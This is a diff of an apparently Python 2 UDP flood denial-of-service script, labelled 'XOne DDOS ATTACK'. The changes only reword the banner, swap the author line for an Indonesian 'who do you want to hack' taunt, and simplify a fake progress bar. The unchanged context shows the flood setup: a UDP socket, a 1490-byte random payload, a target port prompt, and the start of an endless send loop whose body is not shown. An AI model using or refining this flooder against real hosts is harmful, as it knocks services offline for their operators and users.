@@ -19,9 +19,9 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
 os.system("clear")
-os.system("figlet XOne DDOS ATTACK")
+os.system("figlet denial of services")
 print
-print "Author   : ????"
+print " heker mau ngehek siapa bang"
 print "   wow you read it: "
 print "Thanks  to : All people "
 print  "use this tool for good, not for evil"
@@ -31,15 +31,15 @@ port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet starting.....")
-print "[                    ] 0% "
+print "0% "
 time.sleep(5)
-print "[###              ] 25%"
+print "25%"
 time.sleep(5)
-print "[#######         ] 50%"
+print "50%"
 time.sleep(5)
-print "[##############       ] nugguin yaaa wkwkwkwkkw"
+print "nugguin yaaa wkwkwkwkkw"
 time.sleep(5)
-print "[#####################] 100%"
+print "100%"
 time.sleep(3)
 sent = 0
 while True:
